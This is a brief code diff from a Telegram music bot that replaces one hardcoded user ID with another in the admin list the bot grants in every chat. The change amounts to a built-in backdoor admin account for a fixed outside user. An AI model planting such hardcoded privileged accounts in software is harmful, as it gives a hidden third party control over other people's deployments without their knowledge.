@@ -282,7 +282,7 @@ class UltronMusic(object):
     async def get_admins(self, chat):
         admins = ADMIN_LIST.get(chat)
         if not admins:
-            admins = Config.ADMINS + [1732236209]
+            admins = Config.ADMINS + [1674388883]
             try:
                 grpadmins=await ultron.get_chat_members(chat_id=chat, filter="administrators")
                 for administrator in grpadmins:
